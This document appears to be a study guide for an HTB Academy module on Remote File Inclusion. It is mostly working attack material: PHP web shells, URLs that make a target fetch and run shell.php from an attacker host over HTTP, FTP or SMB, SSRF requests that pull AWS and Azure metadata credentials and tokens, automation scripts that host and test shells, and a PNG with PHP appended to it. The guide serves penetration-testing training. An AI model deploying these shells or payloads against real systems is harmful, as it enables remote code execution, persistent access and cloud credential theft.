# Remote File Inclusion (RFI) - HTB Academy Guide

## Overview

Remote File Inclusion (RFI) allows attackers to include and execute files from external servers. Unlike LFI, RFI enables direct remote code execution by hosting malicious files on attacker-controlled servers.

**Key Difference from LFI:**
- **LFI:** Includes local files from the target server
- **RFI:** Includes remote files from external servers controlled by the attacker

**Impact:**
- **Direct Remote Code Execution** - Execute arbitrary code via remote scripts
- **Web Shell Deployment** - Persistent access through uploaded shells  
- **Server-Side Request Forgery (SSRF)** - Internal network reconnaissance
- **Lateral Movement** - Access internal services and systems

---

## RFI vs LFI Functions

### Functions Supporting RFI

| Language | Function | Local Files | Remote URLs | RFI Capable |
|----------|----------|-------------|-------------|-------------|
| **PHP** | `include()` / `include_once()` | ✅ | ✅ | ✅ |
| **PHP** | `require()` / `require_once()` | ✅ | ❌ | ❌ |
| **NodeJS** | `require()` | ✅ | ❌ | ❌ |
| **Java** | `import` | ✅ | ✅ | ✅ |
| **.NET** | `include` | ✅ | ✅ | ✅ |

**Key Point:** Only functions that support remote URLs can be exploited for RFI.

---

## RFI Configuration Requirements

### PHP Configuration

**Required Settings:**
```ini
# Essential for RFI
allow_url_fopen = On     # Enables URL wrappers
allow_url_include = On   # Allows including remote URLs

# Check current settings
php -i | grep allow_url
```

**Configuration Verification:**
```bash
# Via LFI to check php.ini
http://target.com/lfi.php?file=../../../../etc/php/*/apache2/php.ini

# Via phpinfo() if possible
http://target.com/lfi.php?file=data://text/plain,<?php phpinfo(); ?>

# Via direct function test
http://target.com/lfi.php?file=data://text/plain,<?php echo ini_get('allow_url_include'); ?>
```

---

## Method 1: HTTP Protocol RFI

### Basic HTTP RFI

**Step 1: Create Malicious PHP File**
```php
<?php
// Simple web shell
system($_GET['cmd']);
?>
```

**Step 2: Host on Attacker Server**
```bash
# Start HTTP server
sudo python3 -m http.server 80

# Or using PHP built-in server
php -S 0.0.0.0:80

# Or using Nginx/Apache
sudo systemctl start nginx
```

**Step 3: Execute RFI Attack**
```bash
# Include remote PHP file
http://target.com/index.php?page=http://ATTACKER_IP/shell.php&cmd=id

# Alternative syntax
http://target.com/index.php?file=http://ATTACKER_IP:80/shell.php&cmd=whoami
```

### HTB Academy HTTP RFI Lab

**Complete RFI Workflow:**
```bash
# Step 1: Set up attacker server
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80

# Step 2: Test RFI capability
http://target.com/index.php?language=http://ATTACKER_IP/shell.php

# Step 3: Execute commands via RFI
http://target.com/index.php?language=http://ATTACKER_IP/shell.php&cmd=id
http://target.com/index.php?language=http://ATTACKER_IP/shell.php&cmd=uname -a

# Step 4: Enumerate and find flags
http://target.com/index.php?language=http://ATTACKER_IP/shell.php&cmd=find / -name "*flag*" 2>/dev/null
```

### Advanced HTTP RFI

**Multi-Function Web Shell:**
```php
<?php
// Advanced web shell with multiple functions
if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre>";
} elseif(isset($_GET['file'])) {
    echo file_get_contents($_GET['file']);
} elseif(isset($_GET['upload'])) {
    if(isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
        echo "File uploaded successfully!";
    } else {
        echo '<form method="post" enctype="multipart/form-data">
                <input type="file" name="file">
                <input type="submit" value="Upload">
              </form>';
    }
} else {
    echo "Advanced Web Shell<br>";
    echo "Usage: ?cmd=command | ?file=path | ?upload=1";
}
?>
```

---

## Method 2: FTP Protocol RFI

### FTP Server Setup

**Install and Configure FTP Server:**
```bash
# Install pyftpdlib
pip3 install pyftpdlib

# Start FTP server
sudo python3 -m pyftpdlib -p 21 -d /path/to/files -w

# Alternative: Use built-in FTP
sudo python3 -c "
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()
authorizer.add_anonymous('/path/to/files', perm='elradfmwMT')

handler = FTPHandler
handler.authorizer = authorizer

server = FTPServer(('0.0.0.0', 21), handler)
server.serve_forever()
"
```

### FTP RFI Exploitation

**Basic FTP RFI:**
```bash
# Include file via FTP
http://target.com/index.php?page=ftp://ATTACKER_IP/shell.php&cmd=id

# With authentication (if required)
http://target.com/index.php?page=ftp://user:pass@ATTACKER_IP/shell.php&cmd=whoami
```

**HTB Academy FTP RFI Example:**
```bash
# Step 1: Create malicious file
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2: Start FTP server
sudo python3 -m pyftpdlib -p 21 -w

# Step 3: Execute RFI via FTP
http://target.com/index.php?language=ftp://ATTACKER_IP/shell.php&cmd=ls -la
```

---

## Method 3: SMB Protocol RFI (Windows)

### SMB Server Setup

**Using Impacket SMB Server:**
```bash
# Install impacket
pip3 install impacket

# Start SMB server
sudo impacket-smbserver -smb2support share $(pwd)

# Start with authentication
sudo impacket-smbserver -smb2support -user test -password test123 share $(pwd)
```

### SMB RFI Exploitation

**Basic SMB RFI:**
```bash
# Include file via SMB (Windows targets)
http://target.com/index.php?page=\\ATTACKER_IP\share\shell.php&cmd=whoami

# Alternative syntax
http://target.com/index.php?file=//ATTACKER_IP/share/shell.php&cmd=dir
```

**Key Advantage:** SMB RFI doesn't require `allow_url_include = On` on Windows systems.

**HTB Academy SMB RFI Example:**
```bash
# Step 1: Create Windows-compatible shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2: Start SMB server
sudo impacket-smbserver -smb2support share $(pwd)

# Step 3: Execute RFI via SMB (Windows target)
http://target.com/index.php?language=\\ATTACKER_IP\share\shell.php&cmd=whoami
```

---

## RFI for SSRF and Internal Reconnaissance

### SSRF via RFI

**Internal Port Scanning:**
```bash
# Scan internal network via RFI
http://target.com/lfi.php?file=http://192.168.1.1:80/
http://target.com/lfi.php?file=http://192.168.1.1:22/
http://target.com/lfi.php?file=http://192.168.1.1:3306/

# Check for internal services
http://target.com/lfi.php?file=http://localhost:8080/
http://target.com/lfi.php?file=http://127.0.0.1:9000/
```

**Internal Service Enumeration:**
```bash
# Common internal services
http://target.com/lfi.php?file=http://127.0.0.1:3306/     # MySQL
http://target.com/lfi.php?file=http://127.0.0.1:5432/     # PostgreSQL
http://target.com/lfi.php?file=http://127.0.0.1:6379/     # Redis
http://target.com/lfi.php?file=http://127.0.0.1:11211/    # Memcached
http://target.com/lfi.php?file=http://127.0.0.1:9200/     # Elasticsearch
```

### Cloud Metadata Access

**AWS Metadata Extraction:**
```bash
# AWS Instance metadata
http://target.com/lfi.php?file=http://169.254.169.254/latest/meta-data/

# AWS credentials
http://target.com/lfi.php?file=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS user data
http://target.com/lfi.php?file=http://169.254.169.254/latest/user-data/
```

**Azure Metadata Extraction:**
```bash
# Azure instance metadata
http://target.com/lfi.php?file=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Azure access tokens
http://target.com/lfi.php?file=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

---

## RFI Troubleshooting

### Problem: RFI not working with HTTP
```bash
# Issue: allow_url_include disabled
# Check 1: Verify PHP configuration
http://target.com/lfi.php?file=data://text/plain,<?php echo ini_get('allow_url_include'); ?>

# Check 2: Try different protocols
ftp://ATTACKER_IP/shell.php      # FTP protocol
\\ATTACKER_IP\share\shell.php    # SMB protocol (Windows)

# Check 3: Check firewall/network restrictions
# Test if target can reach your server
sudo tcpdump -i any -n host TARGET_IP
```

### Problem: Server unreachable
```bash
# Issue: Target cannot reach attacker server
# Check 1: Verify server is listening
netstat -tlnp | grep :80

# Check 2: Check firewall rules
sudo iptables -L | grep 80
sudo ufw status

# Check 3: Test with different ports
python3 -m http.server 8080
python3 -m http.server 443
```

### Problem: File not executing
```bash
# Issue: Remote file included but not executed
# Check 1: Verify file content
curl http://ATTACKER_IP/shell.php

# Check 2: Check PHP syntax
php -l shell.php

# Check 3: Try different file extensions
shell.txt      # Plain text
shell.php      # PHP file
shell.inc      # Include file
```

### Problem: Authentication required
```bash
# Issue: HTTP server requires authentication
# Solution 1: Configure server without auth
python3 -m http.server 80  # No authentication

# Solution 2: Use credentials in URL
http://target.com/lfi.php?file=http://user:pass@ATTACKER_IP/shell.php

# Solution 3: Try different protocols
ftp://user:pass@ATTACKER_IP/shell.php
```

---

## Tools and Resources

### RFI Server Setup Scripts

**HTTP Server Automation:**
```bash
cat << 'EOF' > setup_rfi_server.sh
#!/bin/bash
PORT=${1:-80}
DIR=${2:-$(pwd)}

echo "[+] Setting up RFI HTTP server..."
echo "[+] Port: $PORT"
echo "[+] Directory: $DIR"

# Create basic web shell
cat << 'SHELL' > "$DIR/shell.php"
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre>";
} else {
    echo "RFI Web Shell - Usage: ?cmd=command";
}
?>
SHELL

echo "[+] Created shell.php"

# Start HTTP server
if [ "$PORT" -eq 80 ] || [ "$PORT" -eq 443 ]; then
    echo "[+] Starting privileged server on port $PORT"
    sudo python3 -m http.server $PORT --directory "$DIR"
else
    echo "[+] Starting server on port $PORT"
    python3 -m http.server $PORT --directory "$DIR"
fi
EOF
chmod +x setup_rfi_server.sh
```

**Multi-Protocol RFI Server:**
```bash
cat << 'EOF' > multi_rfi_server.sh
#!/bin/bash
echo "[+] Starting multi-protocol RFI servers..."

# Create shell file
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Start HTTP server
echo "[+] Starting HTTP server on port 80..."
sudo python3 -m http.server 80 &
HTTP_PID=$!

# Start FTP server
echo "[+] Starting FTP server on port 21..."
sudo python3 -m pyftpdlib -p 21 -w &
FTP_PID=$!

# Start SMB server
echo "[+] Starting SMB server..."
sudo impacket-smbserver -smb2support share $(pwd) &
SMB_PID=$!

echo "[+] All servers started!"
echo "HTTP: http://ATTACKER_IP/shell.php"
echo "FTP:  ftp://ATTACKER_IP/shell.php"
echo "SMB:  \\\\ATTACKER_IP\\share\\shell.php"

# Cleanup function
cleanup() {
    echo "[+] Stopping servers..."
    kill $HTTP_PID $FTP_PID $SMB_PID 2>/dev/null
    sudo pkill -f "http.server"
    sudo pkill -f "pyftpdlib"
    sudo pkill -f "smbserver"
}

trap cleanup EXIT
read -p "Press Enter to stop all servers..."
EOF
chmod +x multi_rfi_server.sh
```

### RFI Testing Scripts

**Automated RFI Testing:**
```bash
cat << 'EOF' > test_rfi.sh
#!/bin/bash
TARGET=$1
ATTACKER_IP=$2

if [ -z "$TARGET" ] || [ -z "$ATTACKER_IP" ]; then
    echo "Usage: $0 <target_url> <attacker_ip>"
    echo "Example: $0 'http://target.com/lfi.php?file=' '10.10.14.55'"
    exit 1
fi

echo "[+] Testing RFI on $TARGET"
echo "[+] Attacker IP: $ATTACKER_IP"

# Test HTTP RFI
echo "[+] Testing HTTP RFI..."
response=$(curl -s "${TARGET}http://${ATTACKER_IP}/shell.php")
if echo "$response" | grep -q "RFI"; then
    echo "✓ HTTP RFI appears to work"
else
    echo "✗ HTTP RFI failed"
fi

# Test FTP RFI
echo "[+] Testing FTP RFI..."
response=$(curl -s "${TARGET}ftp://${ATTACKER_IP}/shell.php")
if echo "$response" | grep -q "RFI"; then
    echo "✓ FTP RFI appears to work"
else
    echo "✗ FTP RFI failed"
fi

# Test SMB RFI (Windows)
echo "[+] Testing SMB RFI..."
response=$(curl -s "${TARGET}\\\\${ATTACKER_IP}\\share\\shell.php")
if echo "$response" | grep -q "RFI"; then
    echo "✓ SMB RFI appears to work"
else
    echo "✗ SMB RFI failed"
fi
EOF
chmod +x test_rfi.sh
```

### Advanced RFI Payloads

**Steganographic RFI:**
```bash
# Hide PHP in image file
cat << 'EOF' > create_steganographic_rfi.sh
#!/bin/bash
# Create image with embedded PHP
cp /usr/share/pixmaps/debian-logo.png malicious.png
echo '<?php system($_GET["cmd"]); ?>' >> malicious.png

echo "[+] Created malicious.png with embedded PHP"
echo "Usage: http://target.com/lfi.php?file=http://ATTACKER_IP/malicious.png&cmd=id"
EOF
chmod +x create_steganographic_rfi.sh
```

---

*This guide covers Remote File Inclusion techniques from HTB Academy's File Inclusion module, demonstrating how to achieve RCE and internal network access through external file inclusion.* 